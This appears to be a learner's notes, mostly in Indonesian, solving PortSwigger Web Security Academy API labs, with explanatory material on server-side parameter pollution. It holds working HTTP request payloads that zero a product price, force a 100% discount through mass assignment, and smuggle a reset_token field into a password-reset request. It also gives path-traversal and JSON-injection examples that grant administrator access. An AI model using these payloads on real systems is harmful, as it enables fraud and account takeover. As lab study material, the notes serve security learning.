


## Lab: Finding and exploiting an unused API endpoint
solve soal 2:

cara solve saya: 
1. saya pertama mencari api yang mendapatkan /api/1/price, yang di mana 1 adalah id dari product
2. dan saya coba send ke repeeter dan mengganti method ke options untuk check method apa aja yang boleh
3. saya ganti method nya ke patch dan content type ke application json dan edit price nya jadi 0

```json
PATCH /api/products/1/price HTTP/2
Host: 0a79003d044fd86384887fcc00b900b5.web-security-academy.net
Cookie: session=8fiekNKFDbPyeyasFgPPrnn21o4Mm3IV
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a79003d044fd86384887fcc00b900b5.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json
Content-Length: 20

{
	"price" : 0
}
```

respone:

```json
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

## Lab: Exploiting a mass assignment vulnerability

solve soal 3: 

langkah-langkah: 
1. saya mencari sebuah endpoint untuk edit price, tapi tidak ke temu saya coba place order dan saya tertarik dengan kata discount di method GET nya
2. saya coba paste object json nya dan ganti ke 100 discount nya


```json
POST /api/checkout HTTP/2
Host: 0a440013048f589ed086dfa8005800e3.web-security-academy.net
Cookie: session=EFC2ClSfc1k8Ta6wtIoiHpAbioO6tUKj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a440013048f589ed086dfa8005800e3.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 92
Origin: https://0a440013048f589ed086dfa8005800e3.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"chosen_products":[{"product_id":"1","quantity":1}],
"chosen_discount":{"percentage":100}}
```


dan solve

# Parameter Polution



For example, you could modify the query string to the following:

`GET /userSearch?name=peter%23foo&back=/home`

The front-end will try to access the following URL:

`GET /users/search?name=peter#foo&publicProfile=true`

jika web nya mengembalikan pengguna peter itu mungkin query api nya sudah terpotong, jika mendapatkan error pesan `Invalid name` maka itu tidak valid

## Menyuntikkan parameter yang tidak valid

Anda dapat menggunakan kode URL `&` karakter untuk mencoba menambahkan parameter kedua ke permintaan sisi server.

Misalnya, Anda dapat mengubah string kueri menjadi yang berikut:

`GET /userSearch?name=peter%26foo=xyz&back=/home`

Hal ini menghasilkan permintaan sisi server berikut ke API internal:

`GET /users/search?name=peter&foo=xyz&publicProfile=true`

Tinjau respons untuk mendapatkan petunjuk tentang cara penguraian parameter tambahan. Misalnya, jika responsnya tidak berubah, hal ini mungkin menunjukkan bahwa parameter berhasil dimasukkan tetapi diabaikan oleh aplikasi.

Untuk mendapatkan gambaran yang lebih lengkap, Anda perlu menguji lebih lanjut.

## Mengganti parameter yang ada

Untuk mengonfirmasi apakah aplikasi rentan terhadap polusi parameter sisi server, Anda dapat mencoba mengganti parameter asli. Lakukan ini dengan memasukkan parameter kedua dengan nama yang sama.

Misalnya, Anda dapat mengubah string kueri menjadi yang berikut:

`GET /userSearch?name=peter%26name=carlos&back=/home`

Hal ini menghasilkan permintaan sisi server berikut ke API internal:

`GET /users/search?name=peter&name=carlos&publicProfile=true`

**cara solve lab nya**


```json
POST /forgot-password HTTP/2
Host: 0afc00be04d368c5826b97600022006d.web-security-academy.net
Cookie: session=c6mFYUo1E5reILpcbxdbRrE2YqgeFi2l
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0afc00be04d368c5826b97600022006d.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 83
Origin: https://0afc00be04d368c5826b97600022006d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=ejjMpOVxZH8P2K5YkeQhMUohCOOOOXRx&username=administrator%26field=reset_token%23
```

di sini saya pertama itu menggunakan tanda &username=carlos dan ternyata juga masih bisa, terus saya coba ganti username ke field=FUZZ# dan ternyata mungkin query nya terpotong. sebelum itu saya coba pakai #FOO dulu dan ternyata terpotong


dan untuk test token ganti method ke GET dan tambah query param reset_token=value


## Menguji polusi parameter sisi server di jalur REST

RESTful API dapat menempatkan nama dan nilai parameter di jalur URL, bukan di string kueri. Misalnya, pertimbangkan jalur berikut:

`/api/users/123`

Jalur URL mungkin dipecah sebagai berikut:

- `/api` adalah titik akhir API root.
- `/users` mewakili sumber daya, dalam hal ini `users`.
- `/123`mewakili parameter, di sini pengidentifikasi untuk pengguna tertentu.

Pertimbangkan sebuah aplikasi yang memungkinkan Anda mengedit profil pengguna berdasarkan nama pengguna mereka. Permintaan dikirim ke titik akhir berikut:

`GET /edit_profile.php?name=peter`

Hal ini menghasilkan permintaan sisi server berikut:

`GET /api/private/users/peter`

Penyerang mungkin dapat memanipulasi parameter jalur URL sisi server untuk mengeksploitasi API. Untuk menguji kerentanan ini, tambahkan urutan traversal jalur untuk mengubah parameter dan mengamati bagaimana aplikasi merespons.

Anda dapat mengirimkan dengan kode URL `peter/../admin` sebagai nilai dari `name` parameter:

`GET /edit_profile.php?name=peter%2f..%2fadmin`

Hal ini mungkin mengakibatkan permintaan sisi server berikut:

`GET /api/private/users/peter/../admin`

Jika klien sisi server atau API back-end menormalkan jalur ini, hal ini mungkin dapat diatasi `/api/private/users/admin`.


## Testing for server-side parameter pollution in structured data formats

Penyerang mungkin dapat memanipulasi parameter untuk mengeksploitasi kerentanan dalam pemrosesan format data terstruktur lainnya di server, seperti JSON atau XML. Untuk mengujinya, masukkan data terstruktur yang tidak terduga ke dalam input pengguna dan lihat bagaimana server merespons.

Pertimbangkan sebuah aplikasi yang memungkinkan pengguna untuk mengedit profil mereka, kemudian menerapkan perubahan mereka dengan permintaan ke API sisi server. Saat Anda mengedit nama Anda, browser Anda membuat permintaan berikut:

`POST /myaccount name=peter`

Hal ini menghasilkan permintaan sisi server berikut:

`PATCH /users/7312/update {"name":"peter"}`

Anda dapat mencoba menambahkan `access_level` parameter ke permintaan sebagai berikut:

`POST /myaccount name=peter","access_level":"administrator`

Jika input pengguna ditambahkan ke data JSON sisi server tanpa validasi atau sanitasi yang memadai, hal ini akan menghasilkan permintaan sisi server berikut:

`PATCH /users/7312/update {name="peter","access_level":"administrator"}`

Hal ini dapat mengakibatkan pengguna `peter` diberi akses administrator.

Pertimbangkan contoh serupa, tetapi input pengguna sisi klien ada dalam data JSON. Saat Anda mengedit nama Anda, browser Anda membuat permintaan berikut:

`POST /myaccount {"name": "peter"}`

Hal ini menghasilkan permintaan sisi server berikut:

`PATCH /users/7312/update {"name":"peter"}`

Anda dapat mencoba menambahkan `access_level` parameter ke permintaan sebagai berikut:

`POST /myaccount {"name": "peter\",\"access_level\":\"administrator"}`

Jika input pengguna didekodekan, lalu ditambahkan ke data JSON sisi server tanpa pengkodean yang memadai, hal ini akan menghasilkan permintaan sisi server berikut:

`PATCH /users/7312/update {"name":"peter","access_level":"administrator"}`

Sekali lagi, hal ini dapat mengakibatkan pengguna `peter` diberi akses administrator.

Injeksi format terstruktur juga dapat terjadi dalam respons. Misalnya, hal ini dapat terjadi jika input pengguna disimpan dengan aman di database, lalu disematkan ke dalam respons JSON dari API back-end tanpa pengkodean yang memadai. Anda biasanya dapat mendeteksi dan mengeksploitasi injeksi format terstruktur dalam respons dengan cara yang sama seperti dalam permintaan.